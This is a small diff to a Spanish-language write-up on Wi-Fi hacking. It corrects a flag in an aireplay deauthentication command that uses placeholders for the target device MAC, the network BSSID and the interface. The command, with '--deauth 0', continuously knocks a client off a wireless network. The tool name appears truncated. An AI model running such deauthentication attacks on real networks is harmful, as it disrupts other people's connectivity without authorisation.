@@ -7,7 +7,7 @@ Para mi sorpresa cuando me adentre en el mundo de el Hacking Wifi pensaba que so
 
 
 ```bash
-sudo aireplay- --deauth 0 -e {MAC_DEL_DISPOSITIVO} -a {BSSID_DE_LA_RED} {INTERFAZ_DE_RED_A_USAR}
+sudo aireplay- --deauth 0 -c {MAC_DEL_DISPOSITIVO} -a {BSSID_DE_LA_RED} {INTERFAZ_DE_RED_A_USAR}
 ```
 
 
